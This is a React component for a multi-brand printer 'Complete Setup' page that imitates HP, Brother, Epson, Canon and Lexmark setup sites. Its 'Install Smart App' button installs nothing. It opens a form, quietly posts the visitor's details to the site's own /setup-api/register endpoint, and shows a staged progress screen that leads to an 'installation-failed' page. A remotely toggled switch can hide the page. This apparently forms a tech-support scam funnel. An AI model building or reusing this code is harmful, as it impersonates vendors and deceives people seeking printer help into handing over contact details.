import React, { useRef, useState } from 'react';
import { Helmet } from 'react-helmet-async';
import { useNavigate, useParams } from 'react-router-dom';
import FinalStep from './FinalStep';
import SetupProgressModal from './SetupProgressModal';
import BrandFooter from './BrandFooter';

const brandConfigs = {
  HP: {
    logo: "/hp-bg.png",
    printerImg: "/hp-printer-software.png",
    bgImage: "/hero_background_image copy.webp",
    installButtonBgColor: "bg-red-600",
    installButtonTextColor: "text-white",
    installButtonHoverColor: "bg-red-700",
    appStoreUrl: "https://apps.apple.com/app/hp-smart/id469284907",
    playStoreUrl: "https://play.google.com/store/apps/details?id=com.hp.printercontrol&hl=en&gl=US",
    msStoreUrl: "https://apps.microsoft.com/store/detail/hp-smart/9WZDNCRFHWLH",
  },
  Brother: {
    logo: "/brother-bg.png",
    printerImg: "/brother-bg-image-bg.png",
    bgImage: "/hero_background_image copy.webp",
    installButtonBgColor: "bg-blue-950",
    installButtonTextColor: "text-white",
    installButtonHoverColor: "bg-blue-200",
    appStoreUrl: "https://apps.apple.com/app/brother-iprint-scan/id382775642",
    playStoreUrl: "https://play.google.com/store/apps/details?id=com.brother.mfc.brprint&hl=en&gl=US",
    msStoreUrl: "https://apps.microsoft.com/store/detail/brother-iprint-scan/9WZDNCRFJTRJ",
  },
  EPSON: {
    logo: "/epson-bg.png",
    printerImg: "/epson-bg-image-bg.png",
    bgImage: "/hero_background_image copy.webp",
    installButtonBgColor: "bg-blue-950",
    installButtonTextColor: "text-white",
    installButtonHoverColor: "bg-blue-200",
    appStoreUrl: "https://apps.apple.com/app/epson-smart-panel/id1474044348",
    playStoreUrl: "https://play.google.com/store/apps/details?id=com.epson.smartpanel&hl=en&gl=US",
    msStoreUrl: "https://www.microsoft.com/en-us/p/epson-print-and-scan/9nblggh516bp",
  },
  Canon: {
    logo: "/canon-bg.png",
    printerImg: "/canon-image-bg.png",
    bgImage: "/canon-gemini2.jpeg",
    installButtonBgColor: "bg-red-600",
    installButtonTextColor: "text-white",
    installButtonHoverColor: "bg-red-700",
    appStoreUrl: "https://apps.apple.com/app/canon-print-inkjet-selphy/id664425773",
    playStoreUrl: "https://play.google.com/store/apps/details?id=jp.co.canon.bsd.ad.pixmaprint&hl=en&gl=US",
    msStoreUrl: "https://apps.microsoft.com/store/detail/canon-print/9WZDNCRDXF71",
  },
  Lexmark: {
    logo: null,
    printerImg: null,
    bgImage: "/hero_background_image copy.webp",
    installButtonBgColor: "bg-green-700",
    installButtonTextColor: "text-white",
    installButtonHoverColor: "bg-green-800",
    appStoreUrl: "https://apps.apple.com/app/lexmark-mobile-print/id538870228",
    playStoreUrl: "https://play.google.com/store/apps/details?id=com.lexmark.print&hl=en&gl=US",
    msStoreUrl: "https://www.microsoft.com/en-us/p/lexmark-print/9nblggh4s3vx",
  },
};

function CompleteSetup() {
  const navigate = useNavigate();
  const { brand } = useParams();
  
  // Find the exact key in brandConfigs that matches the URL parameter case-insensitively
  const brandKey = Object.keys(brandConfigs).find(k => k.toLowerCase() === (brand || '').toLowerCase());
  const config = brandConfigs[brandKey] || {};
  const [showFinalStep, setShowFinalStep] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const nameRef = useRef();
  const [userName, setUserName] = useState('');
  const [printerModel, setPrinterModel] = useState(() => localStorage.getItem('printerModel') || '');

  React.useEffect(() => {
    const fetchSettings = () => {
      fetch(import.meta.env.VITE_API_URL?.replace('/api', '') + '/setup-api/header-visibility')
        .then(res => res.json())
        .then(data => {
          if (data.showCompleteSetupPage === false) {
            navigate('/easy-setup-guide');
          }
        })
        .catch(() => {});
    };
    fetchSettings();
    const intervalId = setInterval(fetchSettings, 10000);
    return () => clearInterval(intervalId);
  }, [navigate]);

  const handleFinalSubmit = (form) => {
    setLoading(true);
    const name = form.name?.trim() || nameRef.current?.value?.trim() || 'User';
    setUserName(name);
    setPrinterModel(form.model?.trim() || printerModel || 'Officejet');
    setShowFinalStep(false);
    setShowModal(true);
    setLoading(false);
    const backendUrl = import.meta.env.VITE_API_URL?.replace('/api', '') || 'http://localhost:5000';
    fetch(`${backendUrl}/setup-api/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(form)
    })
      .then(() => { })
      .catch(() => { });
  };

  const issue = localStorage.getItem('issue');

  if (showModal) {
    return <div className="fixed inset-0 z-50 bg-white flex items-center justify-center"><SetupProgressModal open={showModal} onClose={() => setShowModal(false)} user={userName} printer={printerModel} onError={() => navigate(`/installation-failed/${brand || 'HP'}`)} /></div>;
  }

  if (showFinalStep) {
    return (
      <>
        <Helmet>
          <title>Complete Setup{brand ? ` | ${brand}` : ''} | {brand ? `${brand} Smart App` : 'Printer Smart App'}</title>
        </Helmet>
        {/* Only show a translucent overlay, not a white background */}
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/40 p-2">
          <div className="">
            <FinalStep
              open={showFinalStep}
              onClose={() => setShowFinalStep(false)}
              onBack={() => setShowFinalStep(false)}
              onSubmit={handleFinalSubmit}
              nameRef={nameRef}
              loading={loading}
              modelValue={printerModel}
              setModelValue={setPrinterModel}
            />
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <Helmet>
        <title>Complete Setup{brand ? ` | ${brand}` : ''} | {brand ? `${brand} Smart App` : 'Printer Smart App'}</title>
      </Helmet>
      <div className="w-full min-h-screen bg-white flex flex-col">
        {/* Top blue section */}
        <section
          className="w-full min-h-[560px] flex items-start justify-center relative px-[6%]"
          style={{
            height: '560px',
            backgroundImage: `url('/hero_background_image%20copy.webp')`,
            backgroundSize: 'cover',
            backgroundPosition: 'center',
          }}
        >
          <div className="w-full max-w-[1200px] flex flex-row items-start justify-between relative h-full">
              <div className="flex flex-col justify-center h-full w-full max-w-[700px] pt-8">
              <h1 className="text-white text-3xl md:text-4xl mb-8 leading-tight drop-shadow-lg">Complete setup using {brand ? brand + ' ' : ''}Smart App</h1>
              <p className="text-white text-lg md:text-xl mb-6 font-normal drop-shadow whitespace-normal">
                {brand ? `${brand} Smart App will connect the printer to your computer, install print drivers, and set up scanning features (if applicable)` : 'HP Smart App will connect the printer to your computer, install print drivers, and set up scanning features (if applicable)'}
              </p>
              <ol className="text-white text-lg mb-6 pl-6 list-decimal">
                <li className="mb-1">Make sure your printer is powered on</li>
                <li>Install {brand ? brand + ' ' : ''}Smart App to complete setup</li>
              </ol>
              <button
                className={`${config.installButtonBgColor} ${config.installButtonTextColor} font-semibold px-7 py-3 rounded-full text-lg shadow hover:${config.installButtonHoverColor} transition mb-6 w-fit`}
                onClick={() => {
                  setShowFinalStep(true);
                }}
              >
                Install {brand ? brand + ' ' : ''}Smart App
              </button>
              <div className="bg-transparent text-white text-sm md:text-base mb-4">
                <span className="font-semibold">To use all available printer features</span>, you must install the {brand ? brand + ' ' : ''}Smart app on a mobile device or the latest version of Windows or macOS. Available on:
              </div>
              <div className="flex flex-row gap-3 mb-2">
                <a href={config.appStoreUrl || "https://apps.apple.com/app/hp-smart/id469284907"} target="_blank" rel="noopener noreferrer">
                  <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" className="h-10" />
                </a>
                <a href={config.playStoreUrl || "https://play.google.com/store/apps/details?id=com.hp.printercontrol&hl=en&gl=US"} target="_blank" rel="noopener noreferrer">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" className="h-10" />
                </a>
                <a href={config.msStoreUrl || "https://apps.microsoft.com/store/detail/hp-smart/9WZDNCRFHWLH"} target="_blank" rel="noopener noreferrer">
                  <img src="https://get.microsoft.com/images/en-us%20dark.svg" alt="Microsoft Store" className="h-10 object-contain" />
                </a>
              </div>
            </div>
            <div className="hidden md:flex flex-col items-start h-full absolute right-12 bottom-0 z-10">
              <div className="relative flex flex-col items-start">
                <img
                  src={config.printerImg || "/hp-printer-software.png"}
                  alt={`${brand ? brand + ' ' : ''}Printer Software`}
                  className="h-[170px] w-auto max-w-none drop-shadow-xl"
                  style={{ marginTop: '200px' }}
                />
                <span className="absolute left-1/2 -translate-x-1/2 bottom-2 text-white text-xs font-normal drop-shadow bg-black/30 px-2 rounded whitespace-nowrap">
                  {brand ? brand + ' ' : ''}Printer Software
                </span>
              </div>
            </div>
          </div>
        </section>
        {/* Additional Info Section Below Hero (unchanged, but with brand name) */}
        <div className="w-full max-w-[1200px] mx-auto flex flex-col md:flex-row items-center justify-between mt-12 px-4 mb-12">
          <div className="flex-1 mb-8 md:mb-0">
            <p className="text-lg text-gray-800 mb-4">Install {brand ? brand + ' ' : ''}Smart software and drivers on each device you want to print from.</p>
            <p className="text-lg text-gray-800">Need additional help? Visit <a href="#" className="text-blue-600 underline hover:text-blue-800">{brand ? brand + ' ' : ''}Support</a></p>
          </div>
          <div className="flex-1 flex justify-center md:justify-end">
            {config.logo && (
              <img src={config.logo} alt={`${brand} Logo`} style={{ width: '160px', height: '60px', objectFit: 'contain', background: 'none', borderRadius: 0 }} />
            )}
          </div>
        </div>
        {/* Brand-specific footer for brand routes */}
        {brand && <BrandFooter brand={brand} />}
        {/* FinalStep Modal */}
        {/* {showFinalStep && (
          <FinalStep open={showFinalStep} onClose={() => setShowFinalStep(false)} onSubmit={handleFinalSubmit} />
        )} */}
      </div>
    </>
  );
}

export default CompleteSetup;
